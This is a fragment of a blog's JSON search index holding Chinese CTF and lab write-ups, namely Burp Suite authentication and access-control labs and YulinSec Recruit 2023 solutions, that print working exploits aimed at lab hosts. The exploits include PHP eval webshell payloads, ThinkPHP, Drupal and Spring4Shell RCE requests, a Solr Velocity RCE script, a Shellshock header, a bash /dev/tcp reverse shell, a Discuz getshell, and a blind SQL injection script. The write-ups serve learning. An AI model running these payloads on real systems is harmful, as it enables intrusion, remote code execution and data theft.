bypass本题的目录遍历对文件名后缀的验证，因此我们可以使用%00截断。 将?filename&#x3D;后的数据改成../../../../../etc/passwd%00.jpg即可。","categories":[],"tags":[]},{"title":"Burpsuite靶场--Authentication","slug":"Burpsuite靶场--Authentication","date":"2024-12-22T08:24:16.765Z","updated":"2024-01-26T02:55:59.870Z","comments":true,"path":"2024/12/22/Burpsuite靶场--Authentication/","link":"","permalink":"http://example.com/2024/12/22/Burpsuite%E9%9D%B6%E5%9C%BA--Authentication/","excerpt":"作者：Narcher 时间：2023&#x2F;10&#x2F;18 分类：writeup","text":"作者：Narcher 时间：2023&#x2F;10&#x2F;18 分类：writeup Broken brute-force protection, IP block打开靶场，进入login界面，随便输入账号密码然后burp抓包，之后发送到Intruder模块，模式选择Pitchfork。 由于每错次个就会封ip，所以我们需要在需要爆破的用户名和密码中交替插入正确的用户名和密码，并保证一一对应。 利用notepad++的替换功能，制作字典。 密码字典同理。 之后分别在payload1和payload2导入字典，设置线程数为1，即可开始爆破。 设置筛选carlos 找到长度异常的请求，使用其payload1和payload2登录成功 Username enumeration via account lock本题重复登录5次就会锁定账号，所以把所有账号进行5次枚举，使用Intruder中的Cluster bomb 发现异常数据，猜测auth为用户名，故爆破其密码（虽然有锁定，但我们可以观察报错信息），选用Sniper 发现123456789为密码时报错信息长度异常，使用auth:123456789登录，成功 2FA broken logic先登录wiener:peter，在burp的target-map下找到此网站的login2 尝试将verify修改为我们要攻击的账号，故退出登录，重新登录wiener:peter，只是这次拦截login2，先放过第一个包，再拦截第二个包和第三个包并修改verify为carlos，完成之后发现还要输入验证码，根据登录wiener:peter的经验可知验证码是4位纯数字组合，因此我们直接爆破即可 得验证码为1657，之后输入验证码同时拦截包，将verify改为carlos，即可成功 Brute-forcing a stay-logged-in cookie首先根据现有凭据登录，并勾选stay logged in 登录之后发现存在stay-logged-in base64解密得:wiener:51dc30ddc473d43a6011e9ebba6ca770 后面的部分用MD5解密得到peter 于是我们先退出登录，之后对stay-logged-in进行爆破 需要设置好payload的处理方式，先对密码进行MD5加密，之后添加前缀carlos:，最后进行baes64加密，之后开始爆破 根据长度排序 Y2FybG9zOjlkZjNiMDFjNjBkZjIwZDEzODQzODQxZmYwZDQ0ODJj base64解密：carlos:9df3b01c60df20d13843841ff0d4482c MD5解密：access 成功 Offline password cracking首先利用现有凭据wiener:peter登录，之后去首页随便找一篇博客评论 之后去access log里找到stay-logged-in：Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz base64解密：carlos:26323c16d5f4dabff3bb136f2460a943 MD5解密：onceuponatime 之后删除carlos的账户即可成功 Password reset poisoning via middleware首先，点击忘记密码，输入carlos的用户名，点击submit后用burp拦截，在header位置添加X-Forwarded-Host并指向自己的服务器 之后去服务器的日志中查看发现获取到了carlos的token：3ek1baacsobkwf15q6sqjetimcb6atm8 之后登录wiener的账号并去获取wiener的邮箱账号，并填写在忘记密码页面的信息栏中 前往邮箱获取到重置密码的url，将token改为carlos的token并访问 修改好密码后在点击提交时拦截，将token改为carlos的token并发送 之后用修改后的密码登录carlos即可成功 Password brute-force via password change首先登录wiener:peter，之后通过修改密码查看返回信息 当原密码正确，新密码不一致时，提示New passwords do not match 当原密码错误，新密码不一致时，提示Current password is incorrect 因此我们可以使用新密码不一致来爆破原密码 载入字典，并设置好匹配关键字 爆破成功 之后使用carlos:654321登录即可完成 Broken brute-force protection, multiple credentials per request登录拦截，发现以json格式发送登录凭据 故将字典修改格式 之后以[数据块]的格式发送密码即可成功 2FA bypass using a brute-force attack先利用carlos:montoya进入验证码界面，随便输入验证码测试，发现输入两次错误验证码后会自动终止会话，但是，该用户并未被锁定，意味着我可以无限制地尝试。 如果每次尝试2FA会不断变化，我们没有办法爆破，但如果2FA在使用之前都一直有效，那么我们便可对其进行暴力破解。 登录过程涉及多个需要按顺序执行的请求，因此，我们可以使用宏，并尝试将这些请求合并到一个宏中。 操作步骤如下： &lt;1&gt;登录carlos:montoya &lt;2&gt;随便输入一个验证码，点击提交，报错 &lt;3&gt;进入burp，Project options的sessions，在Macro中选择如下的三个包，并Test macro正常 &lt;4&gt;进入session handling rules，点击Add，在 Scope的URL Scope中, 选择选项 Include all URLs；在Details中点击Add选择Run a marco，并将&lt;3&gt;中的marco加进去 &lt;5&gt;将POST &#x2F;login2发送给Intruder，将字典设置为0000-9999，线程数设为1，爆破验证码即可 (爆破速度超级慢，不建议尝试，等之后有时间再做吧)","categories":[],"tags":[]},{"title":"Burpsuite靶场--Access_control(后四道)","slug":"Burpsuite靶场--Access_control(后四道)","date":"2024-12-22T08:23:03.209Z","updated":"2024-01-26T02:53:33.396Z","comments":true,"path":"2024/12/22/Burpsuite靶场--Access_control(后四道)/","link":"","permalink":"http://example.com/2024/12/22/Burpsuite%E9%9D%B6%E5%9C%BA--Access_control(%E5%90%8E%E5%9B%9B%E9%81%93)/","excerpt":"作者：Narcher 时间：2023&#x2F;10&#x2F;18 分类：writeup","text":"作者：Narcher 时间：2023&#x2F;10&#x2F;18 分类：writeup URL-based access control can be circumvented此网站在&#x2F;admin处有一个未经身份验证的管理面板，但前端不可访问，后端支持X-Original-Url，因此我们可以点击admin后抓包，将GET访问的&#x2F;admin改成&#x2F;，添加X-Original-Url:/admin，发现成功。 再根据返回的前端提示修改为/admin/delete，并GET传参?usernmae&#x3D;carlos，即可成功。 Method-based access control can be circumvented登录administrator，进入Admin panel，选择carlos，点击Upgrade user，并抓包，send to Repeater。 再登录wiener，随便点击任意页面，抓包获取cookie。 将更改权限数据包中的cookie改成wiener的cookie。 请求方式改成POSTX，返回缺少参数，之后再更改请求方法为GET，修改username为wiener，发送（此时一定要处于wiener登录的状态），即可成功。 Multi-step process with no access control on one step登录administrator，进入Admin panel，选择carlos，点击Upgrade user，并抓包，send to Repeater。之后还有一个页面询问Are you sure？，点击yes，同时抓包发送到repeater。 之后登录wiener，随便抓一个包获取cookie，进入repeater，将两个包依次修改为wiener的cookie和姓名并发包，即可成功。 Referer-based access control登录administrator，进入Admin panel，选择carlos，点击Upgrade user，并抓包，send to Repeater。 之后登录wiener，随便抓一个包获取cookie，进入repeater，修改为wiener的cookie和姓名并发包，即可成功。 后两题考点： ​ （图源：http://t.csdnimg.cn/zrhTX，侵删）","categories":[],"tags":[]},{"title":"YulinSec-Recruit-2023-WP","slug":"YulinSec Recruit 2023 WP","date":"2024-11-08T06:38:16.523Z","updated":"2024-11-08T06:56:59.706Z","comments":true,"path":"2024/11/08/YulinSec Recruit 2023 WP/","link":"","permalink":"http://example.com/2024/11/08/YulinSec%20Recruit%202023%20WP/","excerpt":"作者：Narcher 时间：2023&#x2F;10&#x2F;18 分类：writeup","text":"作者：Narcher 时间：2023&#x2F;10&#x2F;18 分类：writeup [Baby]†签到†密文： 密码本： 解码之后：，之后再将解码后的表按先一三后二四的顺序解读，即得明文：WELCOME TO THE CTF GAME！ 题目要求我们将Flag以YulinSec{}包裹，并在每个英文单词间加入单下划线，所有英文字母均为小写。 处理一下得：YulinSec{welcome_to_the_ctf_game!} [Mid-]马赛克星球这题我只做出了第一问，太菜了~~~呜呜~ 根据题目描述我们得知图片先会被马赛克覆盖，后被系统处理后丢尽回收站，因此我们需要按顺序进行。首先进行系统处理的恢复，具体这么做呢？先把图片下载下来康康。 我们得到这个： （什么鬼东西啊！！！） 既然是系统处理，嗯~ o(￣▽￣)o……，啥也想不起来，那我们就按老一套先一把梭试试，先放进binwalk里康康： 发现藏得有东西，我们分离一下： 得到加密马赛克的代码（个人猜测可能和第二问有关）。 这一步操作结束了，并没有得到对第一问有用的信息，我们再去试试下一步经典操作：改图片宽高。 直接上github上找个脚本，恢复一下图片的宽高，用Deformed-Image-Restorer就不错 由此我们得到了被打上马赛克的图片，并得到了Flag: [Easy]盒武器你是？我们下载第一张图片： 放到google识图上看看，一眼武汉理工大学南湖校区的图书馆，但MD5之后交Flag发现不对，经询问铃兰小姐得知要交图书馆的名字，于是改成YulinSec{md5(武汉理工大学南湖校区心至楼)}。 第二问很奇怪，一眼是武汉长江大桥，拍摄视角看起来像是在龟山公园附近，但我把附近的景点都梭哈了一遍也没成功…… 你的名字是？第二问通过问出题人，发现是我猪鼻了，其实还是让题目描述误导了，题目描述举出的例子是人民公园，让我误以为是找公园名字了…… 位置确实是龟山公园没错，但景点应该写龟山风景区，于是改成YulinSec{md5(湖北省武汉市汉阳区龟山北路5号龟山风景区)}。 我怎么想不起来了&gt;w&lt;第三问的话看出题人QQ空间锁定好时间区间爆破就好了(貌似有更好的办法，但我还没找到)。 【Baby】babyurl本题考查ssrf。 这道题本来我是通过绕过localhost做的，后来才知道那是非预期，于是我又重新做了一遍。 首先我们访问题目网页。如下： 查看一下源码： &lt;!-- if(isset($_GET[&#39;urls&#39;]))&#123; $urls = $_GET[&#39;urls&#39;]; $url_host = parse_url($urls,PHP_URL_HOST); curl_get($urls); &#125; --&gt; 点击here得：Please access through local host 既然如此，看了源码再加上题目描述，我们就明白了这是一道ssrf bypass题，因此我们根据源码顺序构造url，GET传参urls,根据要求在头部添加http://,直接传127.0.0.1会被过滤： 因此我们根据题目描述中的格式构造传参?urls=http://foo@127.0.0.1:80@google.com/flag.php，得到flag。 原理就是利用parse_url与curl_get对url解析的不同方式来绕过。 【Baby】babyphp本题考查php的弱比较与强碰撞的绕过。 首先，是对弱比较的绕过。让a!&#x3D;b，但sha1值要相等，我们利用数组绕过： 原理为sha1函数无法处理数组，如果传入的是数组，那么会返回NULL，使二者比较起来相等。 再做第二问的强碰撞。 由于是===，无法使用数组绕过，并且代码是执行我们输入的Yu，而不是直接输出Flag，我们可以使用fastcoll对一句话木马进行处理，使其eval执行我们的一句话木马，进而用蚁剑连接。工具的具体使用方法就请去百度学习吧，这里直接贴出payload:?Yu=%40eval%28%24_POST%5B%22cmd%22%5D%29%3B+%3F%3E%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%DAq%2B%97%8D%02%9B%5C%B5%86%B4%26%E9%DE%BC%CF%FF%FB%DF%F1%B9%BC4%89-%26%825u8%1D%F5J%F1%F9%C8%E0%E7%FF%E7%0F%0C%CC%11%A9%BB%D4%17%DE%85%B5j%F5%A9%26c%1Aa%89%0E%A3y%96E%A2%C1%F4%87f%9B%1E%F7%17%FA%86%E5%A1m%95%97k7%00%C9%26%7E%23%7E%84%B9%9FO_%11%AF%C1%98%CA%B0%2A%85%89%93%DE%ED%9D%EB%98C%EE%E0%02%1C%23V%DD%C2%15%D5%F1iI%D9%21%1E%8E%F8%05&amp;lin=%40eval%28%24_POST%5B%22cmd%22%5D%29%3B+%3F%3E%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%DAq%2B%97%8D%02%9B%5C%B5%86%B4%26%E9%DE%BC%CF%FF%FB%DFq%B9%BC4%89-%26%825u8%1D%F5J%F1%F9%C8%E0%E7%FF%E7%0F%0C%CC%11%A9%3B%D4%17%DE%85%B5j%F5%A9%26c%1Aa%89%8E%A3y%96E%A2%C1%F4%87f%9B%1E%F7%17%FA%86%E5%A1m%95%97k7%00I%26%7E%23%7E%84%B9%9FO_%11%AF%C1%98%CA%B0%2A%85%89%93%DE%ED%9D%EB%98Cn%E1%02%1C%23V%DD%C2%15%D5%F1iI%D9%A1%1E%8E%F8%05 先在网页中执行一下，然后直接用蚁剑。 根目录发现flag2：YulinSec&#123;2b5e2408ee27c31493b3b4728a1afb85&#125;。 【Baby】babyunserialize本题考查基本的php反序列化。 下面我们先构造第一问的payload: &lt;?php$auth = array( &quot;username&quot; =&gt; &quot;YulinSec&quot;, &quot;passwd&quot; =&gt; &quot;i_love_php_unserialize&quot;,);echo serialize($auth);?&gt; 输出：a:2:&#123;s:8:&quot;username&quot;;s:8:&quot;YulinSec&quot;;s:6:&quot;passwd&quot;;s:22:&quot;i_love_php_unserialize&quot;;&#125; 用Hackbar传参得flag1: 接着我们构造第二问的payload: 这里需要提到两个知识点：__construct()魔术方法与php中的引用赋值（具体请自行百度）。 我们将构造的$a的序列化中的空改为%00，payload为：?data=O:5:&quot;Yulin&quot;:4:&#123;s:12:&quot;%00Yulin%00user1&quot;;i:20421610;s:12:&quot;%00Yulin%00user2&quot;;R:2;s:8:&quot;%00*%00pass1&quot;;i:116759636;s:8:&quot;%00*%00pass2&quot;;R:3;&#125; 之后传入得flag2: [EASY]Script Kiddie这题看题目要求，就知道是要学会当脚本小子。因此我们直接去网上找相应的exp即可。 第一题： 有经验的话应该看一眼就知道这是典型的thinkphp的漏洞了，直接去网上搜，这里贴上我搜到的一篇博客：攻防世界 ThinkPHP V5（漏洞解析及利用）-CSDN博客 直接payload:?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag拿到flag。（注：cat /flag可换成其他命令进行执行） 第二题： 继续去搜drupal的相关漏洞，挨个对比，发现是CVE-2018-7600，直接利用现成的payload: POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1Host: 121.5.35.176:30003Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.46Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://121.5.35.176:30003/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6Cookie: JSESSIONID=F52208D5FDBBB4330779120E1AD41487Connection: closeContent-Type:application/x-www-form-urlencodedContent-Length: 110 form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=cat /flag 得到flag：YulinSec&#123;svt9di2rrew26kysr3b3oipkobq40sao&#125;。 第三题： 继续去网上搜spring相关的漏洞，挨个对比，发现是CVE-2022-22965。之后便是按部就班的来。 发送以下请求以更改 Apache Tomcat 中的日志记录配置并将日志写入 JSP 文件： GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1Host: 121.5.35.176:30004Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: closesuffix: %&gt;//c1: Runtimec2: &lt;%DNT: 1Content-Length: 2 然后，访问刚才的 JSP webshell，并执行任意命令，得到flag： 【Mid】MidBypass这道题应该是想教一下蚁剑的基本用法。 首先根据hint中的后门提示，用蚁剑连接： 之后点击即送flag1:YulinSec&#123;1602bc263c2a236f7f4a38859abb8d02&#125; 第二问大概就是要学一下蚁剑的插件使用: 之后直接在根目录下找到flag2: 【Mid】苕皮本题我是通过非预期来做的，之后立马被修了，呜呜呜~~~ 之后也没时间做这个题了，大概把我非预期的思路讲一讲吧。 在我做非预期解的时候，没有对base的过滤，因此，在经过几下本地传参测试后发现，过滤器在读取$shaopi时会控制字符的数量，后来经查证，貌似必须输入3的倍数。于是我们可以利用base64编码后可以随便加减等号的特性进行绕过。payload为：?filter=convert.base64-decode|&amp;shaopi=PChzaGFvcGkpPg 【Baby】RseaE(季末大酬宾)第一次做内网题，瘫~~~ 首先给linux配置上ssh的socks5代理具体方法详见此博客http://t.csdnimg.cn/fYTE4，之后便可直接在虚拟机上进行操作，无需将文件传输到服务器上。 直接利用fscan扫描内网存活主机，得： CVE-2019-17558：先访问http://10.0.20.121/solr/Yulin/config,写份脚本修改params.resource.loader.enabled为true，至此一切准备就绪。脚本贴在下面： import requestsimport json url = &quot;http://10.0.20.121/solr/Yulin/config&quot;headers = &#123; &quot;Content-Type&quot;: &quot;application/json&quot;,&#125;data = &#123; &quot;update-queryresponsewriter&quot;: &#123; &quot;startup&quot;: &quot;lazy&quot;, &quot;name&quot;: &quot;velocity&quot;, &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;, &quot;template.base.dir&quot;: &quot;&quot;, &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;, &quot;params.resource.loader.enabled&quot;: &quot;true&quot; &#125;&#125; response = requests.post(url, headers=headers, data=json.dumps(data)) print(response.status_code)print(response.text) 之后便可进行rce命令执行。 命令执行的payload稍微改一下就能用了，至于脚本，写一个能发包的就行。如下： import requests url = &#39;http://10.0.20.121/solr/Yulin/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27cat%20/flag%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end&#39; response = requests.get(url) print(response.text) CVE-2014-6271：这个比较简单，一个脚本就出来了： import requestsimport json url = &quot;http://10.0.20.156/yulin.cgi&quot;headers = &#123; &quot;User-Agent&quot;: &quot;() &#123; :; &#125;; echo; /bin/cat /flag&quot;,&#125; response = requests.post(url, headers=headers) print(response.status_code)print(response.text) 原理大概是该Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以()&#123;开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。 CVE-2019-0230：这个就麻烦许多（主要是没回显，需要将webshell打到portmap的监听端口上，之后在转发端口查看），在这里就讲一下大体思路吧，就不一步步来了（太麻烦了），首先，先将portmap传到目标服务器，之后设置监听端口与转发端口：./portmap -m 2 -p1 7003 -h2 10.0.20.111 -p2 7004随后利用脚本将命令bash -i &gt;&amp; /dev/tcp/10.0.20.111/7003 0&gt;&amp;1执行以实现反弹shell的目的，之后在本地利用proxychains通过nc监听7004端口数据，发现shell成功反弹，执行cat /flag获取flag：YulinSec&#123;Wo0!_s2_059_1s_s0_Danger0uS&#125; CVE-2014-0160：这个就简单许多了，直接用msf框架里现成的攻击模块就行了。下面的操作便是根据博客https://blog.csdn.net/weixin_39190897/article/details/106879383中的步骤完成。 先执行msfconsole运行msf框架： 再使用search heartbleed查找攻击模块： 之后执行命令use auxiliary/scanner/ssl/openssl_heartbleed选择第一个攻击模块： 设置对应的主机、端口参数： 最后运行run命令，可以看见靶机的64KB信息： 信息中间藏着flag：YulinSec&#123;Wo0!_My_heArt_1s_B133dinG&#125; 【Mid】链式反应本题只做了第一问，还是太菜了，要多练…… 求你先注册吧TAT &amp; 致命后台：进去之后发现是个论坛： 先随便注册一个账号试试（注意：这时候先看看admin账号是否有人，发现已经存在，说明我们注册之后要拿到admin账号的密码）： 注册之后发现有个系统提醒，点进来是admin账号的密码，因此我们可以利用这个来登录admin账号管理后台。 登录之后要干什么呢？（你问我我也不知道，当然是google啦！！！） 搜索Discuz x3.4 getshell，找到了一篇写的特别好的博客：https://www.svenbeast.com/post/discuzx34-hou-tai-xiu-gai-uc_center-pei-zhi-getshell/ 之后便是进入右上角的管理中心—站长—UCenter设置。 1.进入后台站长-UCenter设置，修改UCenter通信密钥为123456并记录下来，填入code.php，修改UC_API&#x3D;http://recruit.xxf.world:12088/uc_server&#39;);eval($_POST[sven]);//，点击保存 2.用大佬的脚本生成code参数的值(注意：此时操作必须加速，如果当超时之后，传参会返回别的内容而不是1，此时code值需要重新生成)： &lt;?php //code.php源代码，可直接使用$uc_key=&quot;123456&quot;;//此处填写刚才UCenter设置的值$time = time() + 720000;$str = &quot;time=&quot;.$time.&quot;&amp;action=updateapps&quot;;$code = authcode($str,&quot;ENCODE&quot;,$uc_key);$code = str_replace(&#39;+&#39;,&#39;%2b&#39;,$code);$code = str_replace(&#39;/&#39;,&#39;%2f&#39;,$code);echo $code; function authcode($string, $operation = &#39;DECODE&#39;, $key = &#39;&#39;, $expiry = 0) &#123; $ckey_length = 4; $key = md5($key != &#39;&#39; ? $key : &#39;123456&#39;); $keya = md5(substr($key, 0, 16)); $keyb = md5(substr($key, 16, 16)); $keyc = $ckey_length ? ($operation == &#39;DECODE&#39; ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : &#39;&#39;; $cryptkey = $keya.md5($keya.$keyc); $key_length = strlen($cryptkey); $string = $operation == &#39;DECODE&#39; ? base64_decode(substr($string, $ckey_length)) : sprintf(&#39;%010d&#39;, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string; $string_length = strlen($string); $result = &#39;&#39;; $box = range(0, 255); $rndkey = array(); for($i = 0; $i &lt;= 255; $i++) &#123; $rndkey[$i] = ord($cryptkey[$i % $key_length]); &#125; for($j = $i = 0; $i &lt; 256; $i++) &#123; $j = ($j + $box[$i] + $rndkey[$i]) % 256; $tmp = $box[$i]; $box[$i] = $box[$j]; $box[$j] = $tmp; &#125; for($a = $j = $i = 0; $i &lt; $string_length; $i++) &#123; $a = ($a + 1) % 256; $j = ($j + $box[$a]) % 256; $tmp = $box[$a]; $box[$a] = $box[$j]; $box[$j] = $tmp; $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256])); &#125; if($operation == &#39;DECODE&#39;) &#123; if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) &#123; return substr($result, 26); &#125; else &#123; return &#39;&#39;; &#125; &#125; else &#123; return $keyc.str_replace(&#39;=&#39;, &#39;&#39;, base64_encode($result)); &#125;&#125;?&gt; 3.带code参数GET发送请求(发送这个请求前后台功能都是不正常的，发送后后台恢复正常)： 请求包如下（注意，code需要替换成上边代码跑出来的值）： GET /api/uc.php?code=3261GqyMWCKWcBrmvnAR%2fMsytT4CniPufkSLlq8qgFENXGRbemdZM%2fO0tQ5UDOmm0gkfa3FziIaBUL6vu2s HTTP/1.1Host: recruit.xxf.world:12088Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,ar;q=0.8Connection: closeContent-Length: 127 &lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;root&gt;&lt;item id=&quot;UC_API&quot;&gt;http://recruit.xxf.world:12088/uc_server&lt;/item&gt;&lt;/root&gt; 4.此时 http://recruit.xxf.world:12088/config/config_ucenter.php就是我们的shell地址，至此getshell结束 5.进入根目录即可查看flag: [BABY]Yulin大超市题目本身不难，但具体操作比较繁琐，本人并没有全部做完，在此仅提供部分问的具体思路。 先根据网上的教程，把vmdk装在vmware上，并启动。 古老内核：cat /etc/redhat-release 旧日石板：启动宝塔，进入宝塔页面后点击左侧数据库，查看密码即可 积尘网页：进入网页后查看左上角图片即可： 草灰蛇线：宝塔页面下载后直接输入命令sha256sum 文件名查看 链颜如玉：九尾狐？？？铃兰小姐！！！ 蠕形混沌：robots.txt了解一下 [Mid]Flag的秘密本题考查内存取证。 1.先查看系统信息： 2.列出所有进程./volatility -f Dump.raw --profile=Win2003SP1x86 pslist： 发现notepad与mspaint两个可疑进程。 3.查看敏感文件： 4.提取flag.txt，./volatility -f Dump.raw --profile=Win2003SP1x86 dumpfiles -Q 0x060f95d8 --dump-dir=.: 查看文件内容，发现只有一串数字：70691670853271109852681369060149805628073794361873811272895446916236918634537737802124349238876320719507791592011549293924620129044462418733627976091293608166259846132773460344531124208572819109443346803355186858756595020342162362128266333303983191990037268180788288653684131880322571968703181766706931560885205101352007538331846213613023266466639921413852926790888220321442027205178887750649656145860474727432919114738728373475836303102255486346191364877477938535572331216821254191679994156591750446573045994279439932542854983843840 猜测和题目描述中的数学公式有关，于是进行万能的google，发现这其实是tupper公式中的key。 5.画图(画图时千万别用github上的脚本，不然会和我一样变得不幸) 提供一个在线网站：https://tuppers-formula.ovh/ 翻转180°得flag前半部分：M2tH_1z_ 继续推测，notepad中有flag前半部分，那么mspaint中大概率有flag的后半部分。 6.提取mspaint进程./volatility -f Dump.raw --profile=Win2003SP1x86 memdump -p 2148 --dump-dir=./ ，再将dmp后缀改为data，之后用GIMP软件查看，不断改变位移、宽高，即可得真实图像。 180°翻转后再镜像翻转即为flag后半部分。 完整flag为：YulinSec&#123;M2tH_1z_s0_iNtlsTInG&#125; [MID-]ezjavaflag1首先我们先看访问一下题目网页，由此可知要读取根目录下的flag1和flag2： 下载题目附件，之后反编译看源码。 由此可知传参方式：当访问&#x2F;flag1&#x2F;*目录时，会转到&#x2F;tmp&#x2F;*，而tmp目录的上一层目录即为根目录。 于是我们便可读取flag1: [MID+]猫物语这道题属实是思路新奇，是我没见过的类型。 先看一下题目描述吧： 根据题目描述我们可以知道本题考查sql注入，且无法使用延时注入和布尔盲注，于是我们可以从“所有内容在原本的基础上都会被加上随机一小段长度的喵！”上下手，增加原本内容的长度，使得返回的“喵”数量超过一定程度，并借此判断是否注入成功。之后的思路就和盲注思路一样了。 脚本如下： import requestsimport time chars = range(48, 129, 1)flag = &#39;&#39;global length length = 50 close = &quot;?id=-1&quot;for i in range(1, length + 1): for char1 in chars: url = &quot;http://124.220.110.41:20001/&quot; payload = &quot; union select 1,2,if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),%d,1))=%d,repeat(&#39;a&#39;,50),1)--+&quot; % ( i, char1) url = url + close + payload res = requests.get(url) print(url + &#39;\\n&#39;) if &quot;喵&quot; * 50 in res.text: flag = flag + chr(char1) print(&quot;flag: &quot; + flag) break print(&quot;flag: &quot; + flag)print(&#39;flag:&#39;, flag) payload请自行根据想要得到的内容进行更改。","categories":[],"tags":[]}],"categories":[],"tags":[]}